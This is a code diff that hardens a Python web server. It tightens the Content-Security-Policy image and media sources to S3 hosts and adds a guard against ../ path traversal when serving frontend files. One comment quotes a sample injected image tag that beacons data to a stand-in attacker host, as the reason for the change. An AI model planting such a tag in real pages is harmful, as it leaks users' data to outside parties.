@@ -100,8 +100,14 @@ async def security_headers(request, call_next):
         resp.headers["Cache-Control"] = "no-store"
     resp.headers["Content-Security-Policy"] = (
         "default-src 'self'; "
-        "img-src 'self' data: blob: https:; "
-        "media-src 'self' blob: https:; "
+        "script-src 'self'; "
+        # Images/media: self + data/blob (avatar crop preview) + the S3 hosts the
+        # blob route 307-redirects to (presigned URLs). Dropped blanket https: so
+        # an injected <img src=https://attacker/?leak> can't beacon out.
+        "img-src 'self' data: blob: https://*.s3.amazonaws.com "
+        "https://*.s3.us-east-1.amazonaws.com https://*.s3.us-west-2.amazonaws.com; "
+        "media-src 'self' blob: https://*.s3.amazonaws.com "
+        "https://*.s3.us-east-1.amazonaws.com https://*.s3.us-west-2.amazonaws.com; "
         "style-src 'self' 'unsafe-inline'; "
         "object-src 'none'; frame-ancestors 'none'; base-uri 'self'"
     )
@@ -213,8 +219,14 @@ if FRONTEND_DIR.exists():
     @app.get("/{full_path:path}")
     def serve_frontend(full_path: str):
         """Serve the React SPA for any non-API route."""
-        file_path = FRONTEND_DIR / full_path
-        if file_path.is_file():
+        file_path = (FRONTEND_DIR / full_path).resolve()
+        # Path-containment guard: only serve files that actually resolve INSIDE
+        # the dist dir (defense against ../ escaping the build output).
+        try:
+            inside = file_path.is_relative_to(FRONTEND_DIR.resolve())
+        except AttributeError:  # Python <3.9 fallback (not expected on 3.12)
+            inside = str(file_path).startswith(str(FRONTEND_DIR.resolve()))
+        if inside and file_path.is_file():
             return FileResponse(file_path)
         return FileResponse(FRONTEND_DIR / "index.html")
 else:
